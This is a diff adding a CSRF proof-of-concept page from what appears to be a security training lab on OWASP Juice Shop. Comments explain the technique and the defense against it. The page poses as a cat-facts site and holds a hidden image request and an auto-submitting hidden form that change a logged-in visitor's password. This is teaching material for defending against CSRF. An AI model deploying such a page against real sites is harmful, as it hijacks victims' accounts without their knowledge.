@@ -1,0 +1,50 @@
+<!--
+Day 9 CSRF PoC -- a minimal, self-contained attacker-hosted page. Nothing
+about this file talks to Juice Shop's real password-change endpoint on load
+unless you deliberately host it and visit it from a browser where you're
+ALSO logged into a running Juice Shop instance you're authorized to test
+(this lab's `juiceshop` container, exposed to your own browser for this one
+demo -- see README.md's "Browser-based steps" section for exactly how, and
+the authorized-use notice at the top of that file).
+
+The technique this demonstrates: a state-changing request with NO anti-CSRF
+token check and NO SameSite restriction on the target's session cookie can
+be triggered by ANY page the victim's browser visits, using only tags a
+browser will fetch automatically -- no JavaScript execution needed, no
+victim click needed beyond "loaded this page while already logged in
+elsewhere." That is exactly the property Defense 3 (anti-CSRF tokens +
+SameSite cookies) exists to remove.
+-->
+<!DOCTYPE html>
+<html>
+<head><title>Totally Harmless Cat Facts</title></head>
+<body>
+  <h1>Did you know? Cats sleep 12-16 hours a day.</h1>
+
+  <!-- The actual PoC: an <img> tag whose "src" is not an image at all, it's
+       a state-changing GET request against Juice Shop's change-password
+       endpoint. The browser requests it automatically to try to render it
+       as an image -- and because it's a plain cross-site GET, the browser
+       attaches whatever Juice Shop session cookie is already sitting in
+       this browser, with no prompt, no visible network tab action a victim
+       would notice, and (on a target with this exact gap) no anti-CSRF
+       token required. Replace JUICESHOP_HOST below with wherever you've
+       exposed juiceshop to your own browser for this demo. -->
+  <img src="http://JUICESHOP_HOST:3000/rest/user/change-password?current=&new=csrf-owned123&repeat=csrf-owned123"
+       style="display:none" alt="">
+
+  <!-- A <form> version of the identical idea, for the case where a target
+       endpoint only accepts POST (most real state-changing endpoints do,
+       and correctly rejecting GET for a state change is itself one layer
+       of defense -- see content/day09-access-ssrf-csrf.md Section 3,
+       Defense 3). This form auto-submits on page load, no click needed:
+       swap the action/inputs for whatever POST endpoint and field names
+       you're demonstrating against. -->
+  <form id="csrf-form" action="http://JUICESHOP_HOST:3000/rest/user/change-password" method="POST" style="display:none">
+    <input type="hidden" name="current" value="">
+    <input type="hidden" name="new" value="csrf-owned123">
+    <input type="hidden" name="repeat" value="csrf-owned123">
+  </form>
+  <script>document.getElementById("csrf-form").submit();</script>
+</body>
+</html>
